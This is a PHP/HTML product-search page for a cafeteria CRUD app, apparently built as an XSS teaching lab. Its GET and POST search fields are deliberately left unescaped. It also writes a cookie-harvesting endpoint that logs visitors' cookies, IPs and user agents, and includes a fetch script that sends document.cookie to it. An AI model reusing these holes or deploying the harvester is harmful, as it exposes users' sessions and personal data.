<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Búsqueda de Productos</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Estilos generales */
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0;
            margin: 0;
            padding: 0;
            line-height: 1.6;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        h1 {
            text-align: center;
            color: #4CAF50;
            font-size: 2.8rem;
            margin-bottom: 2rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        /* Barra de navegación */
        .nav-buttons {
            display: flex;
            justify-content: center;
            gap: 1rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }

        .nav-buttons a {
            padding: 0.8rem 1.5rem;
            background-color: #4CAF50;
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-weight: 500;
            transition: all 0.3s ease;
            border: none;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .nav-buttons a:hover {
            background-color: #45a049;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.2);
        }

        /* Formularios de búsqueda */
        .search-form {
            background: rgba(22, 33, 62, 0.8);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            margin-bottom: 2rem;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }

        .search-form h2 {
            margin-top: 0;
            color: #4CAF50;
            font-size: 1.8rem;
            font-weight: 500;
            margin-bottom: 1.5rem;
        }

        .search-form input[type="text"] {
            width: calc(100% - 140px);
            padding: 1rem;
            border: 2px solid rgba(76, 175, 80, 0.3);
            border-radius: 25px;
            font-size: 1rem;
            color: #e0e0e0;
            background-color: rgba(26, 26, 46, 0.7);
            transition: all 0.3s ease;
            margin-right: 1rem;
        }

        .search-form input[type="text"]:focus {
            border-color: #4CAF50;
            outline: none;
            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
        }

        .search-form button {
            padding: 1rem 1.5rem;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
        }

        .search-form button:hover {
            background-color: #45a049;
            transform: translateY(-2px);
        }

        /* Resultados de búsqueda */
        .results {
            background: rgba(22, 33, 62, 0.8);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }

        .results h3 {
            color: #4CAF50;
            font-size: 1.5rem;
            font-weight: 500;
            margin-bottom: 1.5rem;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin-bottom: 1.5rem;
            background: rgba(26, 26, 46, 0.7);
            border-radius: 10px;
            overflow: hidden;
        }

        th, td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        th {
            background-color: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        tr:hover {
            background-color: rgba(76, 175, 80, 0.1);
            transition: background-color 0.3s ease;
        }

        /* Mensaje de advertencia */
        .warning {
            text-align: center;
            color: white;
            font-size: 2rem;
            font-weight: bold;
            background-color: #ff4444;
            padding: 2rem;
            animation: shake 0.5s infinite;
            text-transform: uppercase;
            letter-spacing: 5px;
            border-radius: 15px;
            margin: 2rem 0;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }

            h1 {
                font-size: 2rem;
            }

            .search-form input[type="text"] {
                width: 100%;
                margin-bottom: 1rem;
            }

            .search-form button {
                width: 100%;
            }

            .nav-buttons {
                flex-direction: column;
            }

            .nav-buttons a {
                width: 100%;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CRUD CAFETERIA</h1>

        <!-- Barra de navegación con botones -->
        <div class="nav-buttons">
            <a href="iniciarsesion.html" class="btn">Iniciar sesión</a>
            <a href="index.html" class="btn">Registrarse</a>
            <a href="cerrarsesion.php" class="btn btn-danger">Cerrar sesión</a>
        </div>

        <!-- Formulario de búsqueda con GET (vulnerable a XSS) -->
        <div class="search-form">
            <h2>Búsqueda con GET (Vulnerable a XSS)</h2>
            <form method="GET" action="">
                <input type="text" name="search_get" placeholder="Buscar productos..." value="<?php echo $search_get; ?>">
                <button type="submit">Buscar</button>
                <?php if (!empty($search_get)): ?>
                    <a href="?clear_search=true" class="btn btn-danger">Limpiar Búsqueda</a>
                <?php endif; ?>
            </form>
        </div>

        <!-- Resultados de la búsqueda con GET -->
        <?php if (!empty($search_get)): ?>
            <div class="results">
                <h3>Resultados para: <?php echo $search_get; ?></h3>
                <table>
                    <thead>
                        <tr>
                            <th>ID Producto</th>
                            <th>Nombre</th>
                            <th>Precio</th>
                            <th>Cantidad</th>
                            <th>Acciones</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (count($productos) > 0): ?>
                            <?php foreach ($productos as $producto): ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($producto['idProducto']); ?></td>
                                    <td><?php echo htmlspecialchars($producto['nombreProducto']); ?></td>
                                    <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
                                    <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
                                    <td>
                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td colspan="5">No se encontraron productos.</td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <!-- Formulario de búsqueda con POST (vulnerable a XSS) -->
        <div class="search-form">
            <h2>Búsqueda con POST (Vulnerable a XSS)</h2>
            <form method="POST" action="">
                <input type="text" name="search_post" placeholder="Buscar productos..." value="<?php echo $search_post; ?>">
                <button type="submit">Buscar</button>
                <?php if (!empty($search_post)): ?>
                    <a href="?clear_search=true" class="btn btn-danger">Limpiar Búsqueda</a>
                <?php endif; ?>
            </form>
        </div>

        <!-- Resultados de la búsqueda con POST -->
        <?php if (!empty($search_post)): ?>
            <div class="results">
                <h3>Resultados para: <?php echo $search_post; ?></h3>
                <table>
                    <thead>
                        <tr>
                            <th>ID Producto</th>
                            <th>Nombre</th>
                            <th>Precio</th>
                            <th>Cantidad</th>
                            <th>Acciones</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (count($productos) > 0): ?>
                            <?php foreach ($productos as $producto): ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($producto['idProducto']); ?></td>
                                    <td><?php echo htmlspecialchars($producto['nombreProducto']); ?></td>
                                    <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
                                    <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
                                    <td>
                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td colspan="5">No se encontraron productos.</td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <!-- Listado completo de productos (si no hay búsqueda) -->
        <?php if (empty($search_get) && empty($search_post)): ?>
            <div class="results">
                <h2>Listado Completo de Productos</h2>
                <table>
                    <thead>
                        <tr>
                            <th>ID Producto</th>
                            <th>Nombre</th>
                            <th>Precio</th>
                            <th>Cantidad</th>
                            <th>Acciones</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (count($productos) > 0): ?>
                            <?php foreach ($productos as $producto): ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($producto['idProducto']); ?></td>
                                    <td><?php echo htmlspecialchars($producto['nombreProducto']); ?></td>
                                    <td><?php echo number_format($producto['precioProducto'], 2, ',', '.'); ?></td>
                                    <td><?php echo htmlspecialchars($producto['cantidadProducto']); ?></td>
                                    <td>
                                        <a class="btn" href="editar_producto.php?id=<?php echo $producto['idProducto']; ?>">Editar</a>
                                        <a class="btn btn-danger" href="eliminar_producto.php?id=<?php echo $producto['idProducto']; ?>" onclick="return confirm('¿Estás seguro de que deseas eliminar este producto?');">Eliminar</a>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td colspan="5">No hay productos disponibles.</td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <a class="btn" href="agregar_producto.php">Agregar Producto</a>
    </div>

    <?php
    // Código para guardar cookies.php
    // Este archivo debe existir en el mismo directorio
    $guardar_cookies_php = <<<'EOD'
<?php
// Recibir los datos JSON
$json_data = file_get_contents('php://input');
$data = json_decode($json_data, true);

if (isset($data['cookie'])) {
    // Guardar la cookie en cookies.txt
    $cookie = $data['cookie'];
    $fecha = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    $contenido = "Fecha: $fecha\nIP: $ip\nUser-Agent: $user_agent\nCookie: $cookie\n\n";
    
    // Guardar en el archivo
    file_put_contents('cookies.txt', $contenido, FILE_APPEND);
    
    // Responder con éxito
    header('Content-Type: application/json');
    echo json_encode(['success' => true]);
} else {
    // Responder con error
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'No cookie data provided']);
}
?>
EOD;

    // Guardar el archivo guardar_cookies.php si no existe
    if (!file_exists('guardar_cookies.php')) {
        file_put_contents('guardar_cookies.php', $guardar_cookies_php);
    }
    ?>

    <!-- Script para detectar y manejar ataques XSS -->
    <?php if ($xss_attack): ?>
    <script>
        // Enviar las cookies a un archivo PHP para guardarlas en cookies.txt
        fetch('guardar_cookies.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ cookie: document.cookie }),
        });
    </script>
    <?php endif; ?>
</body>
</html>